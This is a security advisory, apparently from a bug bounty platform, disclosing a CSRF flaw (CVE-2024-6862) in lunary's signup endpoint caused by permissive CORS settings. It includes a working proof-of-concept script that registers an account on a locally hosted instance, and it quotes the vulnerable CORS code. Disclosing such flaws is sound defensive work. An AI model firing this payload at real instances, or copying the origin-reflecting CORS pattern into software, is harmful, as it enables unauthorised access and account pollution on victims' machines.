CSRF on endpoint for user signup in lunary-ai/lunary

Overly permissive CORS settings expose all unauthed endpoints to CSRF. In general, this allows an attacker to sign up for and create projects/use the instance as if they were an user with local access. The main attack vector would be for instances that are hosted on locally on someone's personal machine, which aren't publicly accessible (since if they were, attackers could just register by visiting the app themselves).
<script>
    const req = new XMLHttpRequest();
        req.onreadystatechange = function () {
        if (req.readyState == XMLHttpRequest.DONE) {
            // Here, with a valid token one can use the token to perform other requests
            // (Create projects, log stuff, etc.)
            console.log(JSON.parse(req.response).token);
        }
    }
    
    req.open("POST", "http://localhost:3333/auth/signup");
    req.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
    req.send(JSON.stringify({
        "email": "somemail@a.com",
        "password": "somepassword",
        "name": "somename",
        "projectName": "Project #1",
        "orgName": "someone's Org",
        "employeeCount": "6-49",
        "whereFindUs": "hackernews",
        "signupMethod": "signup"
    }));
</script>
The CORS settings for the backend is found here, and looks like this:
if (ctx.method === "options") {
    ctx.set("Access-Control-Allow-Origin", ctx.get("Origin") || "*")
    ctx.set("Access-Control-Allow-Methods", "GET, POST, PATCH, OPTIONS, DELETE")
    ctx.set("Access-Control-Allow-Credentials", "true")
    ctx.set(
    "Access-Control-Allow-Headers",
    "Origin, X-Requested-With, Content-Type, Accept, fdi-version, rid, st-auth-mode, Authorization",
    )
    ctx.status = 204
    return
}
await cors({
    origin(ctx) {
        console.log(ctx);
        return ctx.get("Origin") || "*"
    },
    credentials: true,
    allowMethods: ["GET", "POST", "PATCH", "DELETE", "OPTIONS"],
    allowHeaders: ["Content-Type", "Authorization", "Accept"],
})(ctx, next)
In practice, this actually opens up all endpoints to CSRF. However, since most of them need a valid auth token (and those are not accessible to the attacker without access to the localStorage where the auth tokens are kept), it is only intially possible to get at endpoints that do not require any authentication.

Impact
This vulnerability makes it possible for attackers to use a hosted instance of lunary through CSRF, even though the instance itself is not exposed to the network. This can also be misused to pollute the app with an arbitrary number of organisations/users.

Metadata:
CVE CVE-2024-6862 (published)
Vulnerability Type CWE-352: Cross-Site Request Forgery (CSRF)
Severity High (7.4) Attack vector Network Attack complexity Low Privileges required None User interaction Required Scope Changed Confidentiality High Integrity None Availability None Open in visual CVSS calculator
Registry Npm
Affected Version 1.2.34
Visibility Public
Status Fixed
Disclosure Bounty $450
Fix Bounty $112.5
Found by patrik-ha @patrik-ha LIGHTWEIGHT
patrik-ha @patrik-ha LIGHTWEIGHT

Fixed by Hugues Chocart @hughcrt UNPROVEN
Hugues Chocart @hughcrt UNPROVEN
